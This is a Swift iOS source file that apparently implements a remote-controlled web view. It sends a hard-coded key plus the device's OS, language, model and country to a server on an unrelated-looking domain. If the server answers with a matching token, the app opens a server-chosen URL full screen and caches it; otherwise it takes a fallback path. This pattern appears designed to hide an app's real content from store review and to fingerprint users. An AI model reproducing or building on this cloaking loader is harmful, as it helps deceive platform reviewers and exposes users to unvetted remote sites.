
import SwiftUI
import UIKit
import WebKit
import UniformTypeIdentifiers
import PhotosUI
import Combine

enum NexusConfigKey: String {
    case tokenID, serverNode, authCode, cacheURLKey, cacheTokenKey
}

let NexusSettings: [NexusConfigKey: Any] = [
    .tokenID: "GJDFHDFHFDJGSDAGKGHK",
    .serverNode: "https://wallen-eatery.space/ios-st-9/server.php",
    .authCode: "Bs2675kDjkb5Ga",
    .cacheURLKey: "storedTrustedURL",
    .cacheTokenKey: "storedVerificationToken",
]

func nexusSettingValue<T>(_ key: NexusConfigKey) -> T {
    return NexusSettings[key] as! T
}

enum NexusVaultError: Error {
    case invalidStatus(OSStatus)
    case missingRecord
}

func nexusVaultSave(key: String, value: String) throws {
    let data = Data(value.utf8)
    let query: [String: Any] = [
        kSecClass as String: kSecClassGenericPassword,
        kSecAttrAccount as String: key
    ]
    let attributes: [String: Any] = [kSecValueData as String: data]
    let status = SecItemCopyMatching(query as CFDictionary, nil)
    if status == errSecSuccess {
        let updateStatus = SecItemUpdate(query as CFDictionary, attributes as CFDictionary)
        guard updateStatus == errSecSuccess else { throw NexusVaultError.invalidStatus(updateStatus) }
    } else if status == errSecItemNotFound {
        var newItem = query
        newItem[kSecValueData as String] = data
        let addStatus = SecItemAdd(newItem as CFDictionary, nil)
        guard addStatus == errSecSuccess else { throw NexusVaultError.invalidStatus(addStatus) }
    } else {
        throw NexusVaultError.invalidStatus(status)
    }
}

func nexusVaultRead(key: String) throws -> String {
    let query: [String: Any] = [
        kSecClass as String: kSecClassGenericPassword,
        kSecAttrAccount as String: key,
        kSecReturnData as String: true,
        kSecMatchLimit as String: kSecMatchLimitOne
    ]
    var result: AnyObject?
    let status = SecItemCopyMatching(query as CFDictionary, &result)
    if status == errSecSuccess {
        guard let data = result as? Data,
              let str = String(data: data, encoding: .utf8) else {
            throw NexusVaultError.invalidStatus(status)
        }
        return str
    } else if status == errSecItemNotFound {
        throw NexusVaultError.missingRecord
    } else {
        throw NexusVaultError.invalidStatus(status)
    }
}

func nexusDeviceModel() -> String {
    var sys = utsname()
    uname(&sys)
    let mirror = Mirror(reflecting: sys.machine)
    return mirror.children.reduce(into: "") { acc, element in
        if let value = element.value as? Int8, value != 0 {
            acc.append(Character(UnicodeScalar(UInt8(value))))
        }
    }
}

func nexusLocaleCode() -> String {
    let code = Locale.preferredLanguages.first ?? "en"
    return code.components(separatedBy: "-").first?.lowercased() ?? "en"
}

func nexusRegionCode() -> String? {
    Locale.current.regionCode
}

func nexusSystemInfo() -> String {
    "\(UIDevice.current.systemName) \(UIDevice.current.systemVersion)"
}

func nexusControlURL() -> URL? {
    var comps = URLComponents(string: nexusSettingValue(.serverNode) as String)
    comps?.queryItems = [
        URLQueryItem(name: "p", value: nexusSettingValue(.authCode) as String),
        URLQueryItem(name: "os", value: nexusSystemInfo()),
        URLQueryItem(name: "lng", value: nexusLocaleCode()),
        URLQueryItem(name: "devicemodel", value: nexusDeviceModel())
    ]
    if let country = nexusRegionCode() {
        comps?.queryItems?.append(URLQueryItem(name: "country", value: country))
    }
    return comps?.url
}

final class NexusAccessManager: ObservableObject {
    @MainActor @Published var state: ProcessState = .idle
    
    enum ProcessState {
        case idle, checking
        case allowed(token: String, url: URL)
        case fallback
    }
    
    func start() {
        if let savedURLString = UserDefaults.standard.string(forKey: nexusSettingValue(.cacheURLKey)),
           let savedURL = URL(string: savedURLString),
           let savedToken = try? nexusVaultRead(key: nexusSettingValue(.cacheTokenKey)),
           savedToken == (nexusSettingValue(.tokenID) as String) {
            Task { @MainActor in
                state = .allowed(token: savedToken, url: savedURL)
            }
            return
        }
        Task { await nexusRetrieveAccess() }
    }
    
    private func nexusRetrieveAccess() async {
        await MainActor.run { state = .checking }
        guard let url = nexusControlURL() else {
            await MainActor.run { state = .fallback }
            return
        }
        var retry = 0
        while true {
            retry += 1
            do {
                let content = try await nexusDownload(from: url)
                let parts = content.trimmingCharacters(in: .whitespacesAndNewlines).components(separatedBy: "#")
                if parts.count == 2,
                   parts[0] == (nexusSettingValue(.tokenID) as String),
                   let finalURL = URL(string: parts[1]) {
                    UserDefaults.standard.set(finalURL.absoluteString, forKey: nexusSettingValue(.cacheURLKey))
                    try? nexusVaultSave(key: nexusSettingValue(.cacheTokenKey), value: parts[0])
                    await MainActor.run {
                        state = .allowed(token: parts[0], url: finalURL)
                    }
                    return
                } else {
                    await MainActor.run { state = .fallback }
                    return
                }
            } catch {
                let delay = min(pow(2.0, Double(min(retry, 6))), 30.0)
                try? await Task.sleep(nanoseconds: UInt64(delay * 1_000_000_000))
            }
        }
    }
    
    private func nexusDownload(from url: URL) async throws -> String {
        let (data, _) = try await URLSession.shared.data(from: url)
        return String(decoding: data, as: UTF8.self)
    }
}

@available(iOS 14.0, *)
final class NexusWebVC: UIViewController, WKUIDelegate, WKNavigationDelegate, UIDocumentPickerDelegate, PHPickerViewControllerDelegate {
    
    var onStateChange: ((Bool) -> Void)?
    private var webView: WKWebView!
    private var mainURL: URL
    fileprivate var fileHandler: (([URL]?) -> Void)?
    
    init(mainURL: URL) {
        self.mainURL = mainURL
        super.init(nibName: nil, bundle: nil)
        prepareWebView()
    }
    
    required init?(coder: NSCoder) { fatalError() }
    override var prefersStatusBarHidden: Bool { true }
    
    override func viewDidLoad() {
        super.viewDidLoad()
        view.addSubview(webView)
        webView.translatesAutoresizingMaskIntoConstraints = false
        if #available(iOS 11.0, *) {
            webView.insetsLayoutMarginsFromSafeArea = false
            webView.scrollView.contentInsetAdjustmentBehavior = .never
        }
        NSLayoutConstraint.activate([
            webView.topAnchor.constraint(equalTo: view.topAnchor),
            webView.bottomAnchor.constraint(equalTo: view.bottomAnchor),
            webView.leadingAnchor.constraint(equalTo: view.leadingAnchor),
            webView.trailingAnchor.constraint(equalTo: view.trailingAnchor)
        ])
        onStateChange?(true)
        webView.load(URLRequest(url: mainURL))
    }
    
    private func prepareWebView() {
        let config = WKWebViewConfiguration()
        config.preferences.javaScriptEnabled = true
        config.websiteDataStore = .default()
        webView = WKWebView(frame: .zero, configuration: config)
        webView.uiDelegate = self
        webView.navigationDelegate = self
        webView.scrollView.bounces = false
        webView.scrollView.minimumZoomScale = 1.0
        webView.scrollView.maximumZoomScale = 1.0
    }
    
    func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
        onStateChange?(false)
    }
    
    func webView(_ webView: WKWebView, didFail navigation: WKNavigation!, withError error: Error) {
        onStateChange?(false)
    }
}

@available(iOS 14.0, *)
extension NexusWebVC {
    func documentPicker(_ controller: UIDocumentPickerViewController, didPickDocumentsAt urls: [URL]) {
        fileHandler?(urls)
    }
    
    func documentPickerWasCancelled(_ controller: UIDocumentPickerViewController) {
        fileHandler?(nil)
    }
    
    @available(iOS 18.4, *)
    func webView(_ webView: WKWebView,
                 runOpenPanelWith parameters: WKOpenPanelParameters,
                 initiatedByFrame frame: WKFrameInfo,
                 completionHandler: @escaping ([URL]?) -> Void) {
        self.fileHandler = completionHandler
        let alert = UIAlertController(title: "Choose File", message: nil, preferredStyle: .actionSheet)
        alert.addAction(UIAlertAction(title: "Photo/Video", style: .default) { _ in
            var config = PHPickerConfiguration(photoLibrary: .shared())
            config.selectionLimit = 1
            config.filter = .any(of: [.images, .videos])
            let picker = PHPickerViewController(configuration: config)
            picker.delegate = self
            self.present(picker, animated: true)
        })
        alert.addAction(UIAlertAction(title: "Files", style: .default) { _ in
            let picker = UIDocumentPickerViewController(forOpeningContentTypes: [.item], asCopy: true)
            picker.delegate = self
            picker.allowsMultipleSelection = false
            self.present(picker, animated: true)
        })
        alert.addAction(UIAlertAction(title: "Cancel", style: .cancel) { _ in
            completionHandler(nil)
        })
        present(alert, animated: true)
    }
    
    func picker(_ picker: PHPickerViewController, didFinishPicking results: [PHPickerResult]) {
        picker.dismiss(animated: true)
        for provider in results.map({ $0.itemProvider }) {
            if provider.hasItemConformingToTypeIdentifier(UTType.image.identifier) {
                provider.loadFileRepresentation(forTypeIdentifier: UTType.image.identifier) { url, _ in
                    if let url = url {
                        DispatchQueue.main.async {
                            self.fileHandler?([url])
                        }
                    }
                }
            }
        }
    }
}

@available(iOS 14.0, *)
struct NexusWebContainer: UIViewControllerRepresentable {
    let url: URL
    @Binding var loading: Bool
    
    func makeUIViewController(context: Context) -> NexusWebVC {
        let vc = NexusWebVC(mainURL: url)
        vc.onStateChange = { active in
            DispatchQueue.main.async {
                loading = active
            }
        }
        return vc
    }
    
    func updateUIViewController(_ vc: NexusWebVC, context: Context) {}
}

